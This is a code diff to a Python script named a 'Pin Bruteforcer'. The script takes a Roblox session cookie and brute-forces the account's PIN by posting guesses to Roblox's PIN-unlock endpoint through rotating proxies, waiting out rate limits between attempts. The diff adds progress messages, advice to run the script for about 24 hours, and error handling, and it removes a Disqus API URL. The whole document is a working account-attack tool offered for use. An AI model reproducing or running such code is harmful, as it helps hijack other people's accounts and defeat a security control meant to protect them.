@@ -1,13 +1,9 @@
-import os
-import requests
 import requests
 import random
 import string
 import names
 from termcolor import cprint
-import json
 import time
-web = "https://disqus.com/api/3.0/posts/create.json"
 
 proxies = ["http://51.91.157.66:80",
             "http://196.15.221.201:80",
@@ -7781,6 +7777,14 @@ try:
   cookie = input("Enter Your Cookie:")
   check = requests.get('https://api.roblox.com/currency/balance', cookies={'.ROBLOSECURITY': str(cookie)}) #check if the cookie is valid  
   if check.status_code ==200:
+    for char in 'Cracking the pin....':
+      time.sleep(0.1)
+      cprint(char, 'magenta', end='', flush=True)
+    print("")
+    for char in 'Leave this running for about 24 hours':
+      time.sleep(0.1)
+      cprint(char, 'magenta', end='', flush=True)
+    print("")
     def getXsrf(cookie):
       xsrfRequest = requests.post(authurl, cookies={
           '.ROBLOSECURITY': cookie
@@ -7815,10 +7819,27 @@ try:
           cprint(f'Too many requests. Waiting 60 seconds before resumimg', 'yellow')
           waitTime = 60
           c = c - 1
+        elif response['errors'][0]['code'] == 0:
+          if response['errors'][0]['message'] == 'Authorization has been denied for this request.':
+            cprint("Error found. Invalid Cookie. Re-enter the cookie and try again", "red")
+          elif response['errors'][0]['message'] == 'Token Validation Failed':
+            cprint("Error found. Invalid x-csrf token. The program failed to fetch the x-csrf token. Recheck the cookie and the roblox api endpoint. https://auth.roblox.com/v1/account/pin/unlock", "red")
+          break
       except KeyError:
         cprint(f"Pin found: {pin}", 'green')
         break
   else:
     cprint("Invalid Cookie", 'red')
 except:
-  cprint("Pin Bruteforcer Had A Fatal Error", 'red')
+  cprint("Pin Bruteforcer Had A Fatal Error. Diagnosing issue", 'red')
+  check = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers=headers, proxies={"http":proxy}, data={'pin': pin}, cookies=cookies)
+  data = check.json()
+  if check.status_code ==503:
+    cprint("Error found. Roblox is under maintenence", "red")
+  elif response['errors'][0]['message'] == 'Authorization has been denied for this request.':
+    cprint("Error found. Invalid Cookie. Close the program then re-enter the cookie and try again", "red")
+  elif response['errors'][0]['message'] == 'Token Validation Failed':
+    cprint("Error found. Invalid x-csrf token. The program failed to fetch the x-csrf token. Recheck the cookie and the roblox api endpoint. https://auth.roblox.com/v1/account/pin/unlock", "red")
+  elif check.status_code ==404:
+    cprint("Error found. Roblox's api endpoint may have changed", "red")
+  cprint("We advise you close and re-run the program", 'yellow')
